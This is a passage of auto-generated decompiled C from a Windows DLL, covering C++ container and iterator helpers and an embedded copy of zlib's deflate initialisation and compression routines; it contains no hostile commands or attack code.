  sub_1003078F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003075C) --------------------------------------------------------
_DWORD *__stdcall sub_1003075C(_DWORD *a1, int a2)
{
  *a1 = off_10094EB4;
  sub_1000CE26(a1 + 1, a2 + 4);
  return a1;
}
// 10094EB4: using guessed type int (__thiscall *off_10094EB4[4])(void *Block, char);

//----- (1003078F) --------------------------------------------------------
LONG __thiscall sub_1003078F(int *this)
{
  *this = (int)off_10094EB4;
  return sub_1000CE59(this + 1);
}
// 10094EB4: using guessed type int (__thiscall *off_10094EB4[4])(void *Block, char);

//----- (100307B6) --------------------------------------------------------
BOOL __usercall sub_100307B6@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return sub_1000D0B5(a1 + 4, a2 + 4) == 0;
}

//----- (100307D2) --------------------------------------------------------
int __thiscall sub_100307D2(void *this)
{
  _DWORD *v2; // edi
  _DWORD *i; // ecx
  int v4; // ebx
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  bool v8; // bl
  _DWORD *v9; // edi
  _DWORD *j; // ecx
  _DWORD *v11; // eax
  bool v12; // bl
  int v13; // eax
  int v15; // [esp+0h] [ebp-78h]
  int v16; // [esp+4h] [ebp-74h]
  int v17[5]; // [esp+10h] [ebp-68h] BYREF
  int v18[5]; // [esp+24h] [ebp-54h] BYREF
  int v19[5]; // [esp+38h] [ebp-40h] BYREF
  int v20[5]; // [esp+4Ch] [ebp-2Ch] BYREF
  int v21; // [esp+60h] [ebp-18h] BYREF
  int v22[4]; // [esp+64h] [ebp-14h] BYREF
  int v23; // [esp+74h] [ebp-4h]

  sub_10008683();
  v2 = sub_100312B1((int)this, v19);
  v23 = 0;
  for ( i = sub_10031276((int)this, v20); ; i = sub_10031276((int)this, v20) )
  {
    LOBYTE(v23) = 1;
    v8 = !sub_10030F62((int)v2, (int)i);
    LOBYTE(v23) = 0;
    sub_10030E7D(v20);
    v23 = -1;
    sub_10030E7D(v19);
    if ( !v8 )
      break;
    v4 = sub_1001D162((_DWORD *)dword_100BBCF8);
    v5 = sub_10031276((int)this, v17);
    v23 = 2;
    v6 = sub_10030F1B(v5, v18);
    LOBYTE(v23) = 3;
    v7 = sub_10034B33((int)v6, v22);
    LOBYTE(v23) = 4;
    (*(void (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v4 + 36))(v4, (int)this + 4, v7);
    LOBYTE(v23) = 3;
    sub_1000CE59(v22);
    LOBYTE(v23) = 2;
    sub_10034AAA(v18);
    v23 = -1;
    sub_10030E7D(v17);
    v2 = sub_100312B1((int)this, v19);
    v23 = 0;
  }
  v9 = sub_10031224((int)this, v20);
  v23 = 5;
  for ( j = sub_100311E9((int)this, v19); ; j = sub_100311E9((int)this, v19) )
  {
    LOBYTE(v23) = 6;
    v12 = !sub_100311C2((int)v9, (int)j);
    LOBYTE(v23) = 5;
    sub_100310DD(v19);
    v23 = -1;
    sub_100310DD(v20);
    if ( !v12 )
      break;
    v11 = sub_100311E9((int)this, v17);
    v23 = 7;
    sub_1003117B(v11, &v21);
    LOBYTE(v23) = 9;
    sub_100310DD(v17);
    sub_100307D2(v15, v16);
    v23 = -1;
    sub_1003078F(&v21);
    v9 = sub_10031224((int)this, v20);
    v23 = 5;
  }
  v13 = sub_1001D162((_DWORD *)dword_100BBCF8);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v13 + 12))(v13, (int)this + 4);
}
// 1003090C: variable 'v15' is possibly undefined
// 1003090C: variable 'v16' is possibly undefined
// 100BBCF8: using guessed type int dword_100BBCF8;
// 100307D2: using guessed type int var_40[5];
// 100307D2: using guessed type int var_2C[5];
// 100307D2: using guessed type int var_68[5];
// 100307D2: using guessed type int var_54[5];
// 100307D2: using guessed type int var_14[4];

//----- (1003098B) --------------------------------------------------------
_DWORD *__stdcall sub_1003098B(int a1, _DWORD *a2, int a3)
{
  int v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  sub_1000CE26(v5, a1 + 4);
  v7 = 1;
  sub_1000CFB9((int)v5, (int)&unk_100BF74C);
  sub_1000CFB9((int)v5, a3);
  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v3 + 8))(v3, v5);
  sub_100306CD(a2, (int)v5);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_1000CE59(v5);
  return a2;
}
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (10030A04) --------------------------------------------------------
_DWORD *__stdcall sub_10030A04(int a1, _DWORD *a2, int a3)
{
  _DWORD *v3; // eax
  int v5[2]; // [esp+10h] [ebp-20h] BYREF
  int v6[2]; // [esp+18h] [ebp-18h] BYREF
  int v7; // [esp+20h] [ebp-10h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = 0;
  sub_10030C6C(a1, v6);
  v8 = 1;
  v3 = sub_1000CE26(v5, (int)&unk_100BF74C);
  LOBYTE(v8) = 2;
  sub_1000CFB9((int)v6, (int)v3);
  LOBYTE(v8) = 1;
  sub_1000CE59(v5);
  sub_1000CFB9((int)v6, a3);
  sub_100306CD(a2, (int)v6);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000CE59(v6);
  return a2;
}

//----- (10030A7E) --------------------------------------------------------
char __stdcall sub_10030A7E(int a1, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  sub_10008683();
  v2 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v3 = sub_10030C6C(a1, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v2 + 24))(v2, v3, a2);
  v7 = -1;
  sub_1000CE59(v6);
  return v4;
}
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10030A7E: using guessed type int var_14[4];

//----- (10030ACF) --------------------------------------------------------
_DWORD *__stdcall sub_10030ACF(int a1, _DWORD *a2, int a3)
{
  sub_100349A2(a2, a1, a3);
  return a2;
}

//----- (10030B03) --------------------------------------------------------
_DWORD *__stdcall sub_10030B03(int a1, _DWORD *a2, int pExceptionObject, int a4)
{
  int v4; // edi
  _DWORD *v5; // eax
  char v6; // bl
  int *v7; // eax
  int v8; // edi
  _DWORD *v9; // eax
  int v11[5]; // [esp+10h] [ebp-44h] BYREF
  int v12[5]; // [esp+24h] [ebp-30h] BYREF
  int v13[2]; // [esp+38h] [ebp-1Ch] BYREF
  int v14; // [esp+40h] [ebp-14h]
  char v15[12]; // [esp+44h] [ebp-10h] BYREF
  int v16; // [esp+50h] [ebp-4h]

  v14 = 0;
  sub_10008683();
  v4 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v5 = sub_10030C6C(a1, v13);
  v16 = 1;
  v6 = (*(int (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v4 + 24))(v4, v5, pExceptionObject);
  LOBYTE(v16) = 0;
  sub_1000CE59(v13);
  if ( v6 )
  {
    sub_100377E7(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVXsbqaAtiqgxcIvskflXaxsbqaat_qsbdzsml_sr__);
  }
  v15[0] = 0;
  v15[1] = 0;
  sub_10016983((void *)2, (int)v12, v15);
  v16 = 2;
  if ( a4 != 1 )
  {
    v7 = (int *)sub_10016DFF(1, v12, (int)v11, 0);
    LOBYTE(v16) = 3;
    sub_10016B2F(v7, (int)v12);
    LOBYTE(v16) = 2;
    sub_10016B53(v11);
  }
  v8 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v9 = sub_10030C6C(a1, v13);
  LOBYTE(v16) = 4;
  (*(void (__thiscall **)(int, _DWORD *, int, int *, int))(*(_DWORD *)v8 + 32))(v8, v9, pExceptionObject, v12, a4);
  LOBYTE(v16) = 2;
  sub_1000CE59(v13);
  sub_100349A2(a2, a1, pExceptionObject);
  v14 = 1;
  LOBYTE(v16) = 0;
  sub_10016B53(v12);
  return a2;
}
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10030B03: using guessed type int var_30[5];
// 10030B03: using guessed type int var_44[5];

//----- (10030C6C) --------------------------------------------------------
_DWORD *__stdcall sub_10030C6C(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 4);
  return a2;
}

//----- (10030CA1) --------------------------------------------------------
_DWORD *__thiscall sub_10030CA1(_DWORD *this, _DWORD *a2)
{
  const wchar_t *v3; // esi
  const wchar_t *v4; // ebx
  size_t v6; // eax
  wchar_t *String1; // [esp+14h] [ebp-14h]
  size_t MaxCount; // [esp+18h] [ebp-10h]

  v3 = *(const wchar_t **)(this[2] + 12);
  String1 = *(wchar_t **)(dword_100BF750 + 12);
  MaxCount = wcslen(String1);
  v4 = &v3[*(_DWORD *)(this[2] + 28) - MaxCount + 1];
  do
  {
    if ( v4 == v3 )
    {
      sub_1000CE26(a2, (int)(this + 1));
      return a2;
    }
    --v4;
  }
  while ( wcsncmp(String1, v4, MaxCount) );
  v6 = wcslen(String1);
  sub_1000CC20(a2, (wchar_t *)&v4[v6]);
  return a2;
}
// 100BF750: using guessed type int dword_100BF750;

//----- (10030D2F) --------------------------------------------------------
_DWORD *__stdcall sub_10030D2F(_DWORD *a1, void *Block, int a3)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  *a1 = off_10094EB8;
  sub_1000CE26(a1 + 1, (int)Block);
  a1[4] = a3;
  sub_10008683();
  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001D076(v3, (int)(a1 + 1));
  else
    v4 = 0;
  a1[3] = v4;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094EB8: using guessed type int (__thiscall *off_10094EB8[3])(void *Block, char);

//----- (10030D92) --------------------------------------------------------
int *__thiscall sub_10030D92(int *Block, char a2)
{
  sub_10030E7D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030DB1) --------------------------------------------------------
_DWORD *__userpurge sub_10030DB1@<eax>(int a1@<edi>, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax

  *a2 = off_10094EB8;
  sub_1000CE26(a2 + 1, a1 + 4);
  v2 = operator new(0xCu);
  if ( v2 )
    v3 = sub_1003075C(v2, *(_DWORD *)(a1 + 12));
  else
    v3 = 0;
  a2[3] = v3;
  a2[4] = *(_DWORD *)(a1 + 16);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094EB8: using guessed type int (__thiscall *off_10094EB8[3])(void *Block, char);

//----- (10030E12) --------------------------------------------------------
int *__userpurge sub_10030E12@<eax>(int *a1@<esi>, int *Block)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  if ( a1 != Block )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))a1[3];
    if ( v2 )
      (**v2)(v2, 1);
    sub_10002C25(Block + 2, a1 + 2);
    a1[4] = Block[4];
    sub_10008683();
    v3 = operator new(0xCu);
    if ( v3 )
      v4 = sub_1001D076(v3, (int)(a1 + 1));
    else
      v4 = 0;
    a1[3] = (int)v4;
  }
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10030E7D) --------------------------------------------------------
LONG __thiscall sub_10030E7D(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = (int)off_10094EB8;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
    (**v2)(v2, 1);
  return sub_1000CE59(this + 1);
}
// 10094EB8: using guessed type int (__thiscall *off_10094EB8[3])(void *Block, char);

//----- (10030ED2) --------------------------------------------------------
int __thiscall sub_10030ED2(_DWORD *this, int a2)
{
  int v3; // eax

  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, int, _DWORD *, _DWORD))(*(_DWORD *)v3 + 40))(v3, a2, this + 1, this[4]);
  return a2;
}
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (10030F1B) --------------------------------------------------------
_DWORD *__userpurge sub_10030F1B@<eax>(_DWORD *a1@<edi>, _DWORD *a2)
{
  int v2; // eax
  int v4[2]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+18h] [ebp-10h]
  int v6; // [esp+24h] [ebp-4h]

  v5 = 0;
  v2 = sub_10030ED2(a1, (int)v4);
  v6 = 1;
  sub_10030ACF(a1[3], a2, v2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_1000CE59(v4);
  return a2;
}

//----- (10030F62) --------------------------------------------------------
bool __usercall sub_10030F62@<al>(int a1@<eax>, int a2@<ecx>)
{
  return *(_DWORD *)(a1 + 16) == *(_DWORD *)(a2 + 16) && sub_100307B6(*(_DWORD *)(a1 + 12), *(_DWORD *)(a2 + 12));
}

//----- (10030F8A) --------------------------------------------------------
_DWORD *__stdcall sub_10030F8A(_DWORD *a1, int a2, void *Block)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  *a1 = off_10094EBC;
  sub_1000CE26(a1 + 1, a2);
  a1[4] = Block;
  sub_10008683();
  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001D076(v3, a2);
  else
    v4 = 0;
  a1[3] = v4;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094EBC: using guessed type int (__thiscall *off_10094EBC[2])(void *Block, char);

//----- (10030FEF) --------------------------------------------------------
int *__thiscall sub_10030FEF(int *Block, char a2)
{
  sub_100310DD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003100E) --------------------------------------------------------
_DWORD *__userpurge sub_1003100E@<eax>(int a1@<edi>, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax

  *a2 = off_10094EBC;
  sub_1000CE26(a2 + 1, a1 + 4);
  a2[4] = *(_DWORD *)(a1 + 16);
  sub_10008683();
  v2 = operator new(0xCu);
  if ( v2 )
    v3 = sub_1001D076(v2, (int)(a2 + 1));
  else
    v3 = 0;
  a2[3] = v3;
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094EBC: using guessed type int (__thiscall *off_10094EBC[2])(void *Block, char);

//----- (10031072) --------------------------------------------------------
int *__userpurge sub_10031072@<eax>(int *a1@<esi>, int *Block)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  if ( a1 != Block )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))a1[3];
    if ( v2 )
      (**v2)(v2, 1);
    sub_10002C25(Block + 2, a1 + 2);
    a1[4] = Block[4];
    sub_10008683();
    v3 = operator new(0xCu);
    if ( v3 )
      v4 = sub_1001D076(v3, (int)(a1 + 1));
    else
      v4 = 0;
    a1[3] = (int)v4;
  }
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100310DD) --------------------------------------------------------
LONG __thiscall sub_100310DD(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = (int)off_10094EBC;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
    (**v2)(v2, 1);
  return sub_1000CE59(this + 1);
}
// 10094EBC: using guessed type int (__thiscall *off_10094EBC[2])(void *Block, char);

//----- (10031132) --------------------------------------------------------
int __thiscall sub_10031132(_DWORD *this, int a2)
{
  int v3; // eax

  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, int, _DWORD *, _DWORD))(*(_DWORD *)v3 + 16))(v3, a2, this + 1, this[4]);
  return a2;
}
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (1003117B) --------------------------------------------------------
_DWORD *__userpurge sub_1003117B@<eax>(_DWORD *a1@<edi>, _DWORD *a2)
{
  int v2; // eax
  int v4[2]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+18h] [ebp-10h]
  int v6; // [esp+24h] [ebp-4h]

  v5 = 0;
  v2 = sub_10031132(a1, (int)v4);
  v6 = 1;
  sub_10030A04(a1[3], a2, v2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_1000CE59(v4);
  return a2;
}

//----- (100311C2) --------------------------------------------------------
BOOL __usercall sub_100311C2@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(_DWORD *)(a1 + 16) == *(_DWORD *)(a2 + 16) && !sub_1000D0B5(a1 + 4, a2 + 4);
}

//----- (100311E9) --------------------------------------------------------
_DWORD *__stdcall sub_100311E9(int a1, _DWORD *a2)
{
  sub_10030F8A(a2, a1 + 4, 0);
  return a2;
}

//----- (10031224) --------------------------------------------------------
_DWORD *__stdcall sub_10031224(int a1, _DWORD *a2)
{
  int v2; // eax
  void *v3; // eax

  sub_10008683();
  v2 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v3 = (void *)(*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 20))(v2, a1 + 4);
  sub_10030F8A(a2, a1 + 4, v3);
  return a2;
}
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (10031276) --------------------------------------------------------
_DWORD *__stdcall sub_10031276(int a1, _DWORD *a2)
{
  sub_10030D2F(a2, (void *)(a1 + 4), 0);
  return a2;
}

//----- (100312B1) --------------------------------------------------------
_DWORD *__stdcall sub_100312B1(int a1, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax

  sub_10008683();
  v2 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v3 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, a1 + 4);
  sub_10030D2F(a2, (void *)(a1 + 4), v3);
  return a2;
}
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (1003130C) --------------------------------------------------------
int __usercall sub_1003130C@<eax>(_BYTE *a1@<eax>, _DWORD *a2@<ecx>, unsigned int a3)
{
  bool v4; // zf
  _DWORD *v5; // eax
  _DWORD *v6; // edi
  int v7; // eax
  int v8; // eax
  int v9; // eax
  unsigned int v10; // ecx
  _DWORD *v11; // ecx
  __int64 v13; // rax
  int v14; // esi
  int v15; // eax
  int v16; // [esp-20h] [ebp-2Ch]
  int v17; // [esp-14h] [ebp-20h]
  int v19; // [esp+0h] [ebp-Ch]
  int savedregs; // [esp+Ch] [ebp+0h]

  if ( !a1 || *a1 != 49 )
    return -6;
  if ( !a2 )
    return -2;
  v4 = a2[8] == 0;
  a2[6] = 0;
  if ( v4 )
  {
    a2[8] = sub_10039D7C;
    a2[10] = 0;
  }
  if ( !a2[9] )
    a2[9] = sub_10039D8F;
  if ( a3 == -1 )
  {
    a3 = 6;
  }
  else if ( a3 > 9 )
  {
    return -2;
  }
  v5 = (_DWORD *)((int (__cdecl *)(_DWORD, int, int))a2[8])(a2[10], 1, 5824);
  v6 = v5;
  if ( !v5 )
    return -4;
  a2[7] = v5;
  v5[7] = 0;
  *v5 = a2;
  v5[6] = 1;
  v5[12] = 15;
  v5[11] = 0x8000;
  v5[13] = 0x7FFF;
  v5[20] = 15;
  v5[19] = 0x8000;
  v5[21] = 0x7FFF;
  v5[22] = 5;
  v7 = ((int (__cdecl *)(_DWORD, int, int))a2[8])(a2[10], 0x8000, 2);
  v17 = v6[11];
  v6[14] = v7;
  v8 = ((int (__cdecl *)(_DWORD, int, int))a2[8])(a2[10], v17, 2);
  v16 = v6[19];
  v6[16] = v8;
  v6[17] = ((int (__cdecl *)(_DWORD, int, int))a2[8])(a2[10], v16, 2);
  v6[1447] = 0x4000;
  v9 = ((int (__cdecl *)(_DWORD, int, int))a2[8])(a2[10], 0x4000, 4);
  v10 = v6[1447];
  v6[3] = 4 * v10;
  v4 = v6[14] == 0;
  v6[2] = v9;
  if ( v4 || !v6[16] || !v6[17] || !v9 )
  {
    v6[1] = 666;
    a2[6] = aInsufficientMe;
    sub_10031EB8((int)a2);
    return -4;
  }
  v6[1449] = v9 + 2 * (v10 >> 1);
  v6[1446] = v9 + 3 * v10;
  v6[33] = a3;
  v6[34] = 0;
  *((_BYTE *)v6 + 36) = 8;
  v11 = a2;
  savedregs = v19;
  LODWORD(v13) = a2[7];
  if ( !(_DWORD)v13 || !a2[8] || !a2[9] )
    return -2;
  a2[5] = 0;
  a2[2] = 0;
  a2[6] = 0;
  a2[11] = 2;
  *(_DWORD *)(v13 + 16) = *(_DWORD *)(v13 + 8);
  HIDWORD(v13) = *(_DWORD *)(v13 + 24);
  *(_DWORD *)(v13 + 20) = 0;
  if ( v13 < 0 )
    *(_DWORD *)(v13 + 24) = -HIDWORD(v13);
  v14 = *(_DWORD *)(v13 + 24);
  *(_DWORD *)(v13 + 4) = v14 != 0 ? 42 : 113;
  HIDWORD(v13) = v14 != 2;
  v11[12] = HIDWORD(v13);
  *(_DWORD *)(v13 + 40) = 0;
  v15 = sub_10037DA8(v13);
  sub_10032137(v15);
  return 0;
}
// 10031571: conditional instruction was optimized away because ecx.4!=0
// 1003156C: variable 'v19' is possibly undefined

//----- (1003162D) --------------------------------------------------------
int __usercall sub_1003162D@<eax>(int a1@<eax>)
{
  int result; // eax
  _DWORD *v3; // esi

  result = 0;
  if ( !a1 )
    return -2;
  v3 = *(_DWORD **)(a1 + 28);
  if ( !v3 )
    return -2;
  if ( off_10092D08[3 * v3[33]] != sub_1003288E && *(_DWORD *)(a1 + 8) )
    result = sub_1003177B(a1, 1);
  if ( v3[33] != 9 )
  {
    v3[33] = 9;
    v3[32] = 258;
    v3[35] = 32;
    v3[36] = 258;
    v3[31] = 4096;
  }
  v3[34] = 0;
  return result;
}
// 1003288E: using guessed type int __cdecl sub_1003288E(int, int);
// 10092D08: using guessed type int (__cdecl *off_10092D08[3])(int, int);

//----- (1003170C) --------------------------------------------------------
int __usercall sub_1003170C@<eax>(int result@<eax>, __int16 a2@<dx>)
{
  *(_BYTE *)(*(_DWORD *)(result + 8) + (*(_DWORD *)(result + 20))++) = HIBYTE(a2);
  *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = a2;
  ++*(_DWORD *)(result + 20);
  return result;
}

//----- (1003172E) --------------------------------------------------------
int __usercall sub_1003172E@<eax>(int a1@<eax>)
{
  int result; // eax
  size_t v3; // edi
  int v4; // eax
  _DWORD *v5; // esi

  result = *(_DWORD *)(a1 + 28);
  v3 = *(_DWORD *)(result + 20);
  if ( v3 > *(_DWORD *)(a1 + 16) )
    v3 = *(_DWORD *)(a1 + 16);
  if ( v3 )
  {
    memcpy(*(void **)(a1 + 12), *(const void **)(result + 16), v3);
    v4 = *(_DWORD *)(a1 + 28);
    *(_DWORD *)(a1 + 12) += v3;
    *(_DWORD *)(v4 + 16) += v3;
    *(_DWORD *)(a1 + 20) += v3;
    *(_DWORD *)(a1 + 16) -= v3;
    result = *(_DWORD *)(a1 + 28);
    *(_DWORD *)(result + 20) -= v3;
    v5 = *(_DWORD **)(a1 + 28);
    if ( !v5[5] )
    {
      result = v5[2];
      v5[4] = result;
    }
  }
  return result;
}

//----- (1003177B) --------------------------------------------------------
int __usercall sub_1003177B@<eax>(int a1@<edi>, int a2)
{
  int *v2; // esi
  int v3; // eax
  int v4; // edx
  _DWORD *v5; // eax
  int v6; // ecx
  int v7; // eax
  char v8; // al
  int v9; // eax
  char v10; // al
  int v11; // eax
  unsigned int v12; // ecx
  _BYTE *v13; // edx
  int v14; // eax
  int v15; // eax
  int v16; // eax
  unsigned int v17; // ecx
  int v18; // eax
  int v19; // eax
  int v20; // eax
  unsigned int v21; // eax
  unsigned int v22; // eax
  _BYTE *v23; // edx
  int v24; // eax
  unsigned int v25; // eax
  unsigned int v26; // eax
  _BYTE *v27; // edx
  int v28; // eax
  unsigned int v29; // ebx
  unsigned int v30; // eax
  unsigned int v31; // eax
  _BYTE *v32; // edx
  int v33; // eax
  int v34; // ecx
  int v35; // edx
  unsigned int v36; // eax
  unsigned int v37; // eax
  _BYTE *v38; // edx
  int v39; // eax
  unsigned int v40; // ebx
  unsigned int v41; // eax
  unsigned int v42; // eax
  _BYTE *v43; // edx
  int v44; // eax
  int v45; // ecx
  int v46; // edx
  unsigned int v47; // eax
  unsigned int v48; // eax
  _BYTE *v49; // edx
  int v50; // eax
  int v51; // eax
  int v53; // eax
  int v54; // eax
  int v55; // eax
  int v56; // eax
  int v57; // eax
  char v59; // [esp-4h] [ebp-14h]
  int v60; // [esp+8h] [ebp-8h]
  unsigned int v61; // [esp+Ch] [ebp-4h]
  int v62; // [esp+Ch] [ebp-4h]
  int v63; // [esp+Ch] [ebp-4h]

  if ( !a1 )
    return -2;
  v2 = *(int **)(a1 + 28);
  if ( !v2 )
    return -2;
  if ( !*(_DWORD *)(a1 + 12) || !*(_DWORD *)a1 && *(_DWORD *)(a1 + 4) || (v3 = v2[1], v3 == 666) && a2 != 4 )
  {
    *(_DWORD *)(a1 + 24) = aStreamError;
    return -2;
  }
  if ( !*(_DWORD *)(a1 + 16) )
  {
LABEL_9:
    *(_DWORD *)(a1 + 24) = aBufferError;
    return -5;
  }
  v4 = v2[10];
  *v2 = a1;
  v60 = v4;
  v2[10] = a2;
  if ( v3 == 42 )
  {
    if ( v2[6] == 2 )
    {
      *(_DWORD *)(a1 + 48) = 0;
      *(_BYTE *)(v2[2] + v2[5]++) = 31;
      *(_BYTE *)(v2[5] + v2[2]) = -117;
      *(_BYTE *)(++v2[5] + v2[2]) = 8;
      ++v2[5];
      v5 = (_DWORD *)v2[7];
      v6 = v2[5];
      if ( !v5 )
      {
        *(_BYTE *)(v6 + v2[2]) = 0;
        *(_BYTE *)(++v2[5] + v2[2]) = 0;
        *(_BYTE *)(++v2[5] + v2[2]) = 0;
        *(_BYTE *)(++v2[5] + v2[2]) = 0;
        *(_BYTE *)(++v2[5] + v2[2]) = 0;
        ++v2[5];
        v7 = v2[33];
        if ( v7 == 9 )
        {
          v8 = 2;
        }
        else if ( v2[34] >= 2 || v7 < 2 )
        {
          v8 = 4;
        }
        else
        {
          v8 = 0;
        }
        *(_BYTE *)(v2[5] + v2[2]) = v8;
        *(_BYTE *)(++v2[5] + v2[2]) = 11;
        ++v2[5];
        v2[1] = 113;
        goto LABEL_46;
      }
      *(_BYTE *)(v6 + v2[2]) = (*v5 != 0)
                             + (v5[4] == 0 ? 0 : 4)
                             + (v5[7] == 0 ? 0 : 8)
                             + (v5[11] == 0 ? 0 : 2)
                             + (v5[9] == 0 ? 0 : 0x10);
      *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(v2[7] + 4);
      *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(v2[7] + 5);
      *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(v2[7] + 6);
      *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(v2[7] + 7);
      ++v2[5];
      v9 = v2[33];
      if ( v9 == 9 )
      {
        v59 = 2;
      }
      else
      {
        if ( v2[34] < 2 && v9 >= 2 )
        {
          v10 = 0;
LABEL_27:
          *(_BYTE *)(v2[5] + v2[2]) = v10;
          *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(v2[7] + 12);
          ++v2[5];
          v11 = v2[7];
          v12 = v2[5];
          if ( *(_DWORD *)(v11 + 16) )
          {
            *(_BYTE *)(v12 + v2[2]) = *(_BYTE *)(v11 + 20);
            *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(v2[7] + 21);
            v12 = ++v2[5];
          }
          if ( *(_DWORD *)(v2[7] + 44) )
          {
            v13 = (_BYTE *)v2[2];
            if ( v13 )
              v14 = sub_100397A2(*(_DWORD *)(a1 + 48), v13, v12);
            else
              v14 = 0;
            *(_DWORD *)(a1 + 48) = v14;
          }
          v2[8] = 0;
          v2[1] = 69;
          goto LABEL_46;
        }
        v59 = 4;
      }
      v10 = v59;
      goto LABEL_27;
    }
    if ( v2[34] >= 2 || (v15 = v2[33], v15 < 2) )
    {
      v16 = 0;
    }
    else if ( v15 >= 6 )
    {
      v16 = (v15 != 6) + 2;
    }
    else
    {
      v16 = 1;
    }
    v17 = (v16 << 6) | (((v2[12] - 8) << 12) + 2048);
    if ( v2[27] )
      v17 |= 0x20u;
    v2[1] = 113;
    v18 = sub_1003170C((int)v2, v17 - v17 % 0x1F + 31);
    if ( v2[27] )
    {
      v19 = sub_1003170C(v18, *(_WORD *)(a1 + 50));
      sub_1003170C(v19, *(_WORD *)(a1 + 48));
    }
    *(_DWORD *)(a1 + 48) = 1;
  }
LABEL_46:
  if ( v2[1] != 69 )
    goto LABEL_68;
  v20 = v2[7];
  if ( !*(_DWORD *)(v20 + 16) )
    goto LABEL_67;
  v61 = v2[5];
  while ( v2[8] < (unsigned int)*(unsigned __int16 *)(v20 + 20) )
  {
    v21 = v2[5];
    if ( v21 == v2[3] )
    {
      if ( *(_DWORD *)(v2[7] + 44) && v21 > v61 )
      {
        v22 = v21 - v61;
        v23 = (_BYTE *)(v61 + v2[2]);
        if ( v23 )
          v24 = sub_100397A2(*(_DWORD *)(a1 + 48), v23, v22);
        else
          v24 = 0;
        *(_DWORD *)(a1 + 48) = v24;
      }
      sub_1003172E(a1);
      v21 = v2[5];
      v61 = v21;
      if ( v21 == v2[3] )
        break;
    }
    *(_BYTE *)(v21 + v2[2]) = *(_BYTE *)(*(_DWORD *)(v2[7] + 16) + v2[8]);
    ++v2[5];
    ++v2[8];
    v20 = v2[7];
  }
  if ( *(_DWORD *)(v2[7] + 44) )
  {
    v25 = v2[5];
    if ( v25 > v61 )
    {
      v26 = v25 - v61;
